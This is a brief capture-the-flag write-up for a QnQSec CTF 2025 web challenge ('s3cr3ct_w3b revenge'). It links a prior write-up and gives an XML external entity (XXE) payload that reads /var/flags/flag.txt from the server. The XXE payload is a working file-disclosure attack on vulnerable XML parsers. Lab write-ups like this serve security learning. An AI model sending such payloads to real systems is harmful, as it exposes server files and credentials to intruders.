# QnQSec CTF 2025 - s3cr3ct_w3b revenge
Exactly the same with `s3cr3ct_w3b` :Đ

[**QnQSec CTF 2025 — s3cr3ct_w3b (GitHub)**](https://github.com/trannghiach/CTF-Writeups/blob/main/QnQSec%20CTF%202025/Web/s3cr3ct_w3b.md)

Change your payload to:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/flags/flag.txt"> ]>
<data>&xxe;</data>
```

Because they changed the Dockerfile
